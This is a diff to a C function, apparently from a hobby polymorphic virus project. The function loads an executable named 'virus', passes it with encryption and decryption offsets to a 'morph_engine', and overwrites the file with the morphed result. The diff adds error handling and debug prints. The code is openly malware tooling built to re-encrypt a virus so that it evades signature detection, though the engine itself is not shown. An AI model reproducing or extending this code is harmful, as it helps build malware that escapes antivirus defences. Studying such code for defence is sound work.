@@ -18,12 +18,12 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
       // printf("%ul\n", virus_encrypt_size);
       // printf("%ul\n", virus_decrypt_offset);
 
-
+	printf("hi");
 
 	// seed the random number generator
 	srand(time(NULL));
 
-	unsigned long full_addr_enc_begin = virus_instruction_begin;
+	// unsigned long full_addr_enc_begin = virus_instruction_begin;
 
 	// to get offset just delete the most significant char
 	char buffer1[15];
@@ -43,50 +43,82 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	printf("\n");
 
 
-      virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
+    virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
 	virus_decrypt_offset  = (int)strtol(decryption_offset, NULL, 16);
+
+    //   printf("%ul\n", virus_instruction_begin);
+    //   printf("%ul\n", virus_decrypt_offset);
+
+	// printf("hi");
+	// virus_instruction_begin = 1230;
+	// virus_encrypt_size = 2784;
+	// virus_decrypt_offset = 7635;
+
+	printf("hi");
 
       printf("%ul\n", virus_instruction_begin);
       printf("%ul\n", virus_decrypt_offset);
-
-
-
-
-
-
-
-
 	// virus name
 	char filename[] = "virus";
 
-	FILE *f = fopen(filename, "rb");
-	fseek(f, 0, SEEK_END);
-	long fsize = ftell(f);
-	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
-
-	char *string = malloc(fsize + 1);
-	fread(string, 1, fsize, f);
-	fclose(f);
-
-
-
-	// call the polymorphic engine
-	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	// open the executable file
+	FILE* exe_file = fopen(filename, "rb");
+	if(!exe_file)
 	{
-		printf("An error occured in the polymorphic engine\n");
-
+		printf("Failed to open %s\n", filename);
+		return -1;
 	}
 
-	remove(filename);
+	// get the size of the executable file
+	size_t exe_size;
+	fseek(exe_file, 0, SEEK_END);
+	exe_size = ftell(exe_file);
+	rewind(exe_file);
+
+	// allocate the data
+	char* exe_data = malloc(exe_size);
+	if(!exe_data)
+	{
+		fclose(exe_file);
+		printf("Executable data allocation failed\n");
+		return 1;
+	}
+
+	// read the entire executable file
+	if(!fread(exe_data, exe_size, 1, exe_file))
+	{
+		fclose(exe_file);
+		printf("Executable file read failed\n");
+		goto quit;
+	}
+
+	// close the file
+	fclose(exe_file);
+
+	// call the polymorphic engine
+	if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	{
+		printf("An error occured in the polymorphic engine\n");
+		goto quit;
+	}
 
 
-	FILE* out_file = fopen("virus", "wb");
+	// open the output file
+	FILE* out_file = fopen(filename, "wb");
+	if(!out_file)
+	{
+		printf("failed to open %s\n", filename);
+		goto quit;
+	}
+
 	// write the modified executable data
-	fwrite(string, fsize, 1, out_file);
-	fclose(out_file);
+	if(!fwrite(exe_data, exe_size, 1, out_file))
+	{
+		printf("failed to write into %s\n", filename);
+	}
 
-
-	free(string);
-	return 0;
+quit:
+	free(exe_data);
+return 0;
 
 }
